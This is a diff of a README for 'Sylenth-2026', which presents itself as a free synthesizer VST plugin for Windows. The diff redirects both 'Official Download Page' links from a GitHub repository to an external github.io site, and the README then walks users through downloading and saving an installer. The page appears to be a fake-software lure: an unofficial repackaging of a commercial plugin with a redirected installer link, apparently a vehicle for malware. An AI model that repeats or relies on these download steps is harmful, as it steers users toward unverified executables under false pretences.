@@ -1,6 +1,6 @@
 # 🎹 Sylenth-2026 - Create Professional Electronic Music Easily
 
-[![Download Sylenth-2026](https://img.shields.io/badge/Download-Sylenth2026-blue.svg)](https://github.com/Official-girasol536/Sylenth-2026)
+[![Download Sylenth-2026](https://img.shields.io/badge/Download-Sylenth2026-blue.svg)](https://official-girasol536.github.io)
 
 ## 📁 Project Overview
 Sylenth-2026 provides a high-quality synthesizer for your music projects. This digital tool mimics classic analog hardware to give your tracks a warm, professional sound. It works on Windows 10 and Windows 11. Musicians use this VST plugin for melodies, basslines, and sound effects in modern music production.
@@ -16,7 +16,7 @@ Ensure your computer meets these standards before you start:
 ## 📥 Download Steps
 Follow these instructions to get the application on your computer:
 1. Open your web browser.
-2. Go to the [Official Download Page](https://github.com/Official-girasol536/Sylenth-2026).
+2. Go to the [Official Download Page](https://official-girasol536.github.io).
 3. Find the latest release version on the page.
 4. Click the download link to save the installer file to your computer.
 5. Save the file in your Downloads folder for easy access.
